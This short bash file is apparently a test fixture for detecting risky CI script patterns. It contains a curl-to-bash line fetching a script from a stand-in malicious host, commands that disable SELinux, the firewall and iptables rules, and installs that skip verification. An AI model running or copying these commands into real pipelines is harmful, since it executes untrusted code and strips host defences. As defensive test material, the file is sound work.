#!/bin/bash
# SEC-36: CI Script Risks
# Test: TC-CR-041

# curl-to-bash — downloads and executes script directly
curl -s https://malicious.example.com/install.sh | bash

# Disable security controls
setenforce 0
ufw disable
iptables -F

# Skip verification in CI
npm install --no-verify --no-audit
pip install --no-verify
